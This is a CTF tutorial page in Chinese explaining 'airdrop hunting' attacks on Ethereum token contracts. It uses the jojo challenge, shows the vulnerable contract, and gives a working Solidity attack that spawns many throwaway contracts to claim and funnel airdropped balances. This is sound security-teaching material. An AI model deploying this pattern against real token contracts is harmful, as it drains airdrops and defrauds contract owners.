# Airdrop Hunting

## 原理
薅羊毛攻擊指使用多個不同的新賬戶來調用空投函數獲得空投幣並轉賬至攻擊者賬戶以達到財富累計的一種攻擊方式。這類攻擊方式較爲普通且常見，只要是有空投函數的合約都能夠進行薅羊毛。其中首個自動化薅羊毛攻擊出現在 [Simoleon](https://paper.seebug.org/646/) 上。

## 例子
以數字經濟大賽 2019 的 jojo 一題爲例，講解一下如何進行薅羊毛攻擊。題目合約的源碼如下：
```solidity
pragma solidity ^0.4.24;

contract jojo {
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    address owner;
        
    constructor()public{
        owner = msg.sender;
    }
    
    event SendFlag(string b64email);
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        emit SendFlag(b64email);
    }
    
    function jojogame() payable{
        uint geteth = msg.value / 1000000000000000000;
        balanceOf[msg.sender] += geteth;
    }
    
    function gift() public {
        assert(gift[msg.sender] == 0);
        balanceOf[msg.sender] += 100;
        gift[msg.sender] = 1;
    }
    
    function transfer(address to,uint value) public{
        assert(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }
    
}
```

可以發現我們需要滿足 balanceOf[msg.sender] >= 100000 纔可以得到 flag。

題目中有空投函數，每次空投可以使 balance 增加 100。

```solidity
function gift() public {
    assert(gift[msg.sender] == 0);
    balanceOf[msg.sender] += 100;
    gift[msg.sender] = 1;
}
```

並且也有轉賬函數，可以將 balance 轉給其他用戶。

```solidity
function transfer(address to,uint value) public{
    assert(balanceOf[msg.sender] >= value);
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;
}
```

那麼我們可以使用薅羊毛的攻擊方式，創建 1000 個臨時合約來調用空投函數，並轉賬給主合約來使得 balanceOf[msg.sender] >= 100000。

```solidity
contract attack{
    function attack_airdrop(int num){
        for(int i = 0; i < num; i++){
            new middle_attack(this);
        }
    }
    
    function get_flag(string email){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.payforflag(email);
    }
}


contract middle_attack{
    constructor(address addr){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.gift();
        target.transfer(addr,100);
    }
}
```

## 題目

### 數字經濟大賽 2019
- 題目名稱 jojo

### RoarCTF 2019
- 題目名稱 CoinFlip

### QWB 2019
- 題目名稱 babybet

### bctf 2018
- 題目名稱 Fake3d

!!! note
    注：題目附件相關內容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 倉庫尋找。

## 參考
- [首個區塊鏈 token 的自動化薅羊毛攻擊分析](https://paper.seebug.org/646/)
- [數字經濟大賽 2019 - jojo](https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo)

